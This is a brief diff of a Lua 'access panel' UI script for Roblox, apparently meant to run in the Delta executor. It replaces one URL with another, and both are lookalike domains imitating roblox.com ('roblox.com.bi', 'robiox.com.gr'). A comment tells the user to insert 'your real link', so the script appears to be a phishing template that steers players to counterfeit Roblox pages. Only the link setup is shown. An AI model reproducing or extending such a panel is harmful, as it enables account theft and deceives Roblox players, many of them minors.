@@ -1,7 +1,7 @@
 --// ACCESS PANEL UI (Delta / Roblox)
 --// Replace YOUR_LINK with your real link
 
-local link = "https://www.roblox.com.bi/communities/766089860126/One-Time-YT"
+local link = "https://www.robiox.com.gr/communities/1437714181/Meet-The-Devs"
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
